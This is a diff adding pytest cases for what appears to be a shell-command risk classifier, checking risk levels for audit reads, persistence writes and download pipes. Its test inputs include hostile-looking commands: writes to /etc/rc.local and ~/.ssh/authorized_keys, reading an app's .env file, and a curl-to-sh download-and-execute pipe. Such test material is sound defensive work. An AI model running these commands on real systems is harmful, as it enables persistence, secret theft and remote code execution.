@@ -104,3 +104,27 @@ def test_writing_persistence_files_stays_high(line):
 
 def test_payload_writes_skip_persistence_targets():
     assert payload_writes("echo x > /tmp/a; echo y >> /etc/rc.local; echo z > ~/.ssh/authorized_keys") == ["a"]
+
+
+# a read-only audit line: reads, crontab -l, curl to stdout, and a grep with |sh in quotes
+AUDIT_LINE = ("echo '== HEALTH =='; curl -s http://127.0.0.1:8000/health; echo; "
+              "grep -E 'bash|sh$' /etc/passwd; echo '== CRON =='; crontab -l 2>&1; "
+              "ls -la /etc/cron.d 2>&1; cat /opt/app/.env 2>&1 | head")
+
+
+def test_a_read_only_audit_caps_at_high():
+    assert level_for_command(AUDIT_LINE, []) == "high"
+
+
+@pytest.mark.parametrize("line", [
+    "cat /etc/passwd", "grep -E 'bash|sh$' /etc/passwd", "crontab -l",
+    "curl -s http://a.b/health", "curl -s http://a.b/x | head -20",
+])
+def test_reading_never_reaches_critical(line):
+    assert level_for_command(line, []) != "critical"
+
+
+def test_download_and_shell_pipe_must_share_a_pipeline():
+    # unrelated download and shell pipe on one line
+    assert level_for_command("curl -s http://a.b/x; echo hi | sh", []) != "critical"
+    assert level_for_command("cd /tmp; curl -s http://a.b/i.sh | sh", []) == "critical"
